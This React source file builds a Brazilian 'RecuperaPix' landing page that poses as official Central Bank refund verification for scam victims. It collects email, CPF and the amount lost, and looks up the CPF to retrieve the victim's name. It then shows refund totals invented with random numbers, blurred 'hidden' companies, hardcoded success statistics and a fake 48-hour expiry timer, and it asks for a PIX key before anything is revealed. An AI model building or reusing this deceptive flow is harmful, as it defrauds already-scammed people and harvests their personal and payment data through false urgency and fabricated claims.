import { useState, useEffect, useRef, useCallback } from "react";
import { Shield, Users, ArrowRight, CheckCircle2, Lock } from "lucide-react";
import { BRAND } from "@/lib/constants";

// ─── helpers ──────────────────────────────────────────────────────────────────

function formatCPF(raw) {
    return raw.replace(/\D/g, "").slice(0, 11)
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
        .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
}

function isValidCPF(d) {
    if (d.length !== 11 || /^(\d)\1+$/.test(d)) return false;
    let s = 0;
    for (let i = 0; i < 9; i++) s += parseInt(d[i]) * (10 - i);
    let r = (s * 10) % 11; if (r === 10 || r === 11) r = 0;
    if (r !== parseInt(d[9])) return false;
    s = 0;
    for (let i = 0; i < 10; i++) s += parseInt(d[i]) * (11 - i);
    r = (s * 10) % 11; if (r === 10 || r === 11) r = 0;
    return r === parseInt(d[10]);
}

function digitsToDisplay(digits) {
    if (!digits) return "";
    const num = parseInt(digits, 10) / 100;
    return `R$ ${num.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
}

function generateAmounts(rawDigits) {
    const base = rawDigits ? parseInt(rawDigits, 10) / 100 : 500;
    let raw = base * (1.65 + Math.random() * 0.75);
    if (raw < 950) raw = 950 + Math.random() * 350;
    const ODD = [7,13,17,19,23,27,29,31,37,39,41,43,47,53,57,59,61,63,67,69,71,73,77,79,81,83,87,89,91,93,97,99];
    const pick = () => ODD[Math.floor(Math.random() * ODD.length)];
    const intTotal = Math.floor(raw);
    const a1Int = Math.floor(intTotal * (0.55 + Math.random() * 0.1));
    const a2Int = intTotal - a1Int;
    const fmt = n => n.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    return { a1: fmt(a1Int + pick() / 100), a2: fmt(a2Int + pick() / 100), total: fmt(intTotal + pick() / 100) };
}

function useCountUp(targetStr, duration = 1600) {
    const [display, setDisplay] = useState("0,00");
    useEffect(() => {
        const target = parseFloat(String(targetStr).replace(/\./g, "").replace(",", "."));
        if (!target || isNaN(target)) return;
        const start = Date.now();
        let raf;
        const tick = () => {
            const elapsed = Date.now() - start;
            const progress = Math.min(elapsed / duration, 1);
            const eased = 1 - Math.pow(1 - progress, 3);
            setDisplay((target * eased).toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
            if (progress < 1) { raf = requestAnimationFrame(tick); }
        };
        raf = requestAnimationFrame(tick);
        return () => cancelAnimationFrame(raf);
    }, [targetStr, duration]);
    return display;
}

// ─── constants ────────────────────────────────────────────────────────────────

const SCAM_TYPES = [
    "Golpe no PIX", "Fraude em Marketplace", "Compra não entregue",
    "Site falso / Phishing", "Golpe de Investimento", "Golpe no WhatsApp",
    "Aplicativo Falso", "Curso / Mentoria não entregue", "Assinatura indevida", "Outros",
];

const EMAIL_DOMAINS = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@icloud.com", "@live.com"];

const inputCls = "w-full rounded-xl px-4 py-3.5 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50";
const inputBase = { backgroundColor: "#0a1a0f", border: "1px solid #1e3a26" };

// ─── sub-components ───────────────────────────────────────────────────────────

function GateHeader() {
    return (
        <header className="w-full px-4 sm:px-6 py-4 flex items-center justify-between mx-auto max-w-lg">
            <img
                src={BRAND.logoUrl}
                alt="RecuperaPix"
                className="h-10 sm:h-12 w-auto object-contain"
                style={{ filter: "drop-shadow(0 0 12px rgba(0,255,102,0.25))" }}
            />
            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-[#00FF66]/5 border border-[#00FF66]/20">
                <Users className="w-3 h-3 text-[#00FF66]" />
                <span className="text-[11px] text-white/80">
                    <span className="text-[#00FF66] font-semibold">+47 mil</span> recuperados
                </span>
            </div>
        </header>
    );
}

// ─── form stage ───────────────────────────────────────────────────────────────

function FormStage({ onSubmit }) {
    const [email, setEmail]             = useState("");
    const [cpf, setCpf]                 = useState("");
    const [tipoGolpe, setTipoGolpe]     = useState("");
    const [valorDigits, setValorDigits] = useState("");
    const [suggestions, setSuggestions] = useState([]);
    const [cpfData, setCpfData]         = useState(null);
    const [cpfStatus, setCpfStatus]     = useState("idle");

    const cpfDigits = cpf.replace(/\D/g, "");

    useEffect(() => {
        if (cpfDigits.length !== 11) { setCpfData(null); setCpfStatus("idle"); return; }
        if (!isValidCPF(cpfDigits)) { setCpfData(null); setCpfStatus("invalid"); return; }
        setCpfStatus("loading");
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 8000);
        fetch(`/api/cpf/${cpfDigits}`, { headers: { "Accept": "application/json" }, signal: controller.signal })
            .then(r => { clearTimeout(timer); return r.json(); })
            .then(data => { if (data?.NOME) { setCpfData(data); setCpfStatus("found"); } else { setCpfStatus("error"); } })
            .catch(() => { clearTimeout(timer); setCpfStatus("error"); });
    }, [cpfDigits]);

    const handleEmailChange = useCallback((val) => {
        setEmail(val);
        if (!val) { setSuggestions([]); return; }
        const atIdx = val.indexOf("@");
        if (atIdx === -1) {
            setSuggestions(EMAIL_DOMAINS.map(d => val + d));
        } else {
            const typed = val.slice(atIdx);
            setSuggestions(EMAIL_DOMAINS.filter(d => d.startsWith(typed) && d !== typed).map(d => val.slice(0, atIdx) + d));
        }
    }, []);

    const handleSubmit = (e) => {
        e.preventDefault();
        onSubmit({ email, cpf, tipoGolpe, valorDigits, cpfData, amounts: generateAmounts(valorDigits) });
    };

    return (
        <main className="flex-1 flex flex-col items-center justify-center px-4 py-6 sm:py-10">
            <div className="w-full max-w-md">
                {/* Badge */}
                <div className="flex justify-center mb-5">
                    <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-[#00FF66]/5 border border-[#00FF66]/20">
                        <Shield className="w-3.5 h-3.5 text-[#00FF66]" />
                        <span className="text-[11px] tracking-[0.18em] uppercase text-[#00FF66] font-semibold">
                            Verificação Oficial de Reembolso
                        </span>
                    </div>
                </div>

                <h1 className="font-display text-white text-2xl sm:text-3xl font-bold text-center leading-tight mb-2">
                    Descubra quanto você tem
                    <br /><span className="text-[#00FF66]">direito a recuperar</span>
                </h1>
                <p className="text-zinc-400 text-sm text-center mb-6 leading-relaxed">
                    Preencha seus dados abaixo para iniciarmos a verificação gratuita do seu reembolso via Banco Central.
                </p>

                <div className="rounded-2xl p-5 sm:p-6" style={{ backgroundColor: "#0a150e", border: "1px solid #1e3a26" }}>
                    <form onSubmit={handleSubmit} className="flex flex-col gap-4">
                        {/* Email */}
                        <div className="relative">
                            <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">
                                E-mail usado nas compras online
                            </label>
                            <input
                                type="text" inputMode="email" value={email}
                                onChange={e => handleEmailChange(e.target.value)}
                                onBlur={() => setTimeout(() => setSuggestions([]), 150)}
                                placeholder="seuemail@gmail.com" required
                                className={inputCls} style={inputBase}
                            />
                            {suggestions.length > 0 && (
                                <ul className="absolute left-0 right-0 z-20 mt-1 rounded-xl overflow-hidden"
                                    style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                                    {suggestions.map(s => (
                                        <li key={s}>
                                            <button type="button" onMouseDown={() => { setEmail(s); setSuggestions([]); }}
                                                className="w-full text-left px-4 py-2.5 text-sm text-zinc-300 hover:bg-[#00FF66]/10 hover:text-white transition-colors">
                                                {s}
                                            </button>
                                        </li>
                                    ))}
                                </ul>
                            )}
                        </div>

                        {/* CPF */}
                        <div>
                            <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">CPF</label>
                            <input
                                type="text" value={cpf} onChange={e => setCpf(formatCPF(e.target.value))}
                                placeholder="000.000.000-00" required inputMode="numeric"
                                className={inputCls}
                                style={{ ...inputBase, borderColor: cpfStatus === "found" ? "rgba(0,255,102,0.5)" : cpfStatus === "invalid" ? "rgba(239,68,68,0.6)" : "#1e3a26" }}
                            />
                            {cpfStatus === "loading" && <p className="mt-1.5 text-[11px] text-zinc-500 flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-zinc-500 animate-pulse inline-block" />Verificando CPF...</p>}
                            {cpfStatus === "invalid" && <p className="mt-1.5 text-[11px] text-red-400">✕ CPF inválido — verifique e tente novamente</p>}
                            {cpfStatus === "found"   && <p className="mt-1.5 text-[11px] text-[#00FF66]">✓ CPF verificado — dados encontrados</p>}
                        </div>

                        {/* Tipo golpe */}
                        <div>
                            <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">Tipo de golpe sofrido</label>
                            <div className="relative">
                                <select value={tipoGolpe} onChange={e => setTipoGolpe(e.target.value)} required
                                    className="w-full rounded-xl px-4 py-3.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50 appearance-none"
                                    style={{ ...inputBase, color: tipoGolpe ? "#fff" : "#52525b" }}>
                                    <option value="" disabled>Selecione...</option>
                                    {SCAM_TYPES.map(t => <option key={t} value={t} style={{ color: "#fff" }}>{t}</option>)}
                                </select>
                                <div className="pointer-events-none absolute right-4 top-1/2 -translate-y-1/2 text-[#00FF66] text-xs">▼</div>
                            </div>
                        </div>

                        {/* Valor */}
                        <div>
                            <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">Valor aproximado perdido (R$)</label>
                            <input
                                type="text" value={digitsToDisplay(valorDigits)}
                                onChange={e => setValorDigits(e.target.value.replace(/\D/g, "").slice(0, 10))}
                                placeholder="R$ 0,00" required inputMode="numeric"
                                className={inputCls} style={inputBase}
                            />
                        </div>

                        <div className="flex items-center justify-center gap-4 py-1">
                            {["Análise gratuita", "SSL seguro", "Sem compromisso"].map(t => (
                                <span key={t} className="flex items-center gap-1 text-[10px] text-zinc-500">
                                    <CheckCircle2 className="w-3 h-3 text-[#00FF66]/60 flex-shrink-0" />{t}
                                </span>
                            ))}
                        </div>

                        <button type="submit"
                            className="w-full py-4 rounded-xl font-bold text-black text-base tracking-tight transition-all duration-200 hover:brightness-110 active:scale-[0.98] flex items-center justify-center gap-2 shadow-[0_0_24px_rgba(0,255,102,0.25)]"
                            style={{ backgroundColor: "#00FF66" }}>
                            🔍 VERIFICAR MEU REEMBOLSO AGORA
                            <ArrowRight className="w-4 h-4" />
                        </button>
                    </form>
                </div>

                <div className="mt-5 flex items-center justify-center gap-6">
                    {[{ n: "+47 mil", l: "Casos analisados" }, { n: "R$ 2.8M", l: "Recuperados" }, { n: "100%", l: "Gratuito" }].map(({ n, l }) => (
                        <div key={l} className="flex flex-col items-center">
                            <span className="text-[#00FF66] font-bold text-sm">{n}</span>
                            <span className="text-zinc-600 text-[10px]">{l}</span>
                        </div>
                    ))}
                </div>
                <p className="mt-4 text-center text-[11px] text-zinc-700">
                    🔒 Dados protegidos com criptografia SSL · Nunca compartilhados
                </p>
            </div>
        </main>
    );
}

// ─── results stage ────────────────────────────────────────────────────────────

function ResultsStage({ data, onContinue }) {
    const amounts      = data.amounts;
    const countedTotal = useCountUp(amounts?.total || "0,00");
    const [expiry, setExpiry] = useState(48 * 3600);

    useEffect(() => {
        const id = setInterval(() => setExpiry(p => p > 0 ? p - 1 : 0), 1000);
        return () => clearInterval(id);
    }, []);

    const pad = n => String(n).padStart(2, "0");
    const expiryStr = `${pad(Math.floor(expiry / 3600))}:${pad(Math.floor((expiry % 3600) / 60))}:${pad(expiry % 60)}`;

    return (
        <main className="flex-1 flex flex-col items-center justify-center px-4 py-6 sm:py-10">
            <div className="w-full max-w-md flex flex-col gap-3">

                {/* Análise concluída */}
                <div className="rounded-2xl p-5 text-center" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <div className="w-14 h-14 rounded-full bg-[#00FF66] flex items-center justify-center mx-auto mb-3 shadow-[0_0_24px_rgba(0,255,102,0.4)]">
                        <svg className="w-7 h-7 text-black" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                        </svg>
                    </div>
                    <h2 className="text-white font-bold text-lg mb-1">
                        ANÁLISE FEITA COM <span className="text-[#00FF66]">SUCESSO!</span>
                    </h2>
                    <p className="text-zinc-400 text-xs mb-4">Foi constatado, você tem</p>

                    {/* Valor com animação */}
                    <div className="w-full rounded-xl py-3 px-5 mb-2" style={{ backgroundColor: "#00FF66" }}>
                        <span className="font-bold text-2xl text-black font-mono tabular-nums" style={{ filter: "blur(3px)" }}>
                            R$ {countedTotal}
                        </span>
                    </div>
                    <p className="text-[#00FF66] text-xs mb-1">🔒 Valor oculto por segurança</p>
                    <p className="text-zinc-400 text-xs leading-relaxed">
                        de reembolsos pendentes referente às suas compras online.{" "}
                        <span className="text-white font-medium">Receba com juros e correções monetárias.</span>
                    </p>
                </div>

                {/* Reembolsos identificados */}
                <div className="flex items-center justify-between mb-1 px-1">
                    <span className="text-[9px] font-bold tracking-[0.15em] text-zinc-400 uppercase">Reembolsos Identificados</span>
                    <span className="text-xs text-[#00FF66] font-semibold">2 pendentes</span>
                </div>

                {[{ icon: "📦", amount: amounts?.a1 }, { icon: "🛒", amount: amounts?.a2 }].map(({ icon, amount }, i) => (
                    <div key={i} className="rounded-2xl p-3 flex items-center gap-3" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                        <div className="w-9 h-9 rounded-xl flex items-center justify-center text-base flex-shrink-0" style={{ backgroundColor: "#111d15" }}>{icon}</div>
                        <div className="flex-1 min-w-0">
                            <div className="flex items-center justify-between mb-1">
                                <span className="text-xs text-zinc-400" style={{ filter: "blur(3px)" }}>Empresa {i + 1} ••••••</span>
                                <span className="text-[9px] bg-yellow-900/40 text-yellow-400 px-1.5 py-0.5 rounded-full border border-yellow-700/50 flex-shrink-0 ml-2">🔒 OCULTO</span>
                            </div>
                            <div className="flex items-center justify-between">
                                <span className="font-bold text-sm text-[#00FF66]" style={{ filter: "blur(2.5px)" }}>R$ {amount}</span>
                                <span className="text-[10px] text-red-400 font-bold font-mono flex-shrink-0 ml-2">VENCE EM {expiryStr}</span>
                            </div>
                        </div>
                    </div>
                ))}

                {/* Total */}
                <div className="rounded-2xl p-3 flex items-center justify-between" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <span className="text-white text-sm font-semibold">Total disponível</span>
                    <span className="font-bold text-white text-sm" style={{ filter: "blur(2.5px)" }}>R$ {amounts?.total}</span>
                </div>

                {/* Aviso urgência */}
                <p className="text-center text-xs text-yellow-500 font-mono tabular-nums">
                    ⚠ Valores expiram em <span className="font-bold">{expiryStr}</span> — Solicite agora
                </p>

                {/* CTA */}
                <button
                    onClick={onContinue}
                    className="w-full py-4 rounded-2xl font-bold text-black text-sm tracking-tight transition-all duration-200 hover:brightness-110 active:scale-[0.98] shadow-[0_0_28px_rgba(0,255,102,0.35)] flex items-center justify-center gap-2"
                    style={{ backgroundColor: "#00FF66" }}
                >
                    💳 ACESSAR MEU REEMBOLSO AGORA
                    <ArrowRight className="w-4 h-4" />
                </button>

                <div className="rounded-2xl p-3 text-center" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <p className="text-white font-semibold text-xs mb-1">🔒 Empresas ocultas por segurança</p>
                    <p className="text-zinc-500 text-xs leading-relaxed">
                        Os nomes das empresas e valores exatos são revelados após o cadastro da sua chave PIX.
                    </p>
                </div>

                <p className="text-center text-[11px] text-zinc-700">🔒 Análise gratuita · Dados protegidos · SSL</p>
            </div>
        </main>
    );
}

// ─── main component ───────────────────────────────────────────────────────────

export default function GatePage({ onComplete }) {
    const [stage, setStage]     = useState("form"); // "form" | "results"
    const [gateResult, setGateResult] = useState(null);

    const handleFormSubmit = (data) => {
        setGateResult(data);
        setStage("results");
    };

    return (
        <div
            className="min-h-screen bg-[#050A08] flex flex-col"
            style={{ backgroundImage: "radial-gradient(ellipse 80% 50% at 50% -20%, rgba(0,255,102,0.06) 0%, transparent 100%)" }}
        >
            <GateHeader />
            {stage === "form" && <FormStage onSubmit={handleFormSubmit} />}
            {stage === "results" && gateResult && (
                <ResultsStage data={gateResult} onContinue={() => onComplete(gateResult)} />
            )}
        </div>
    );
}
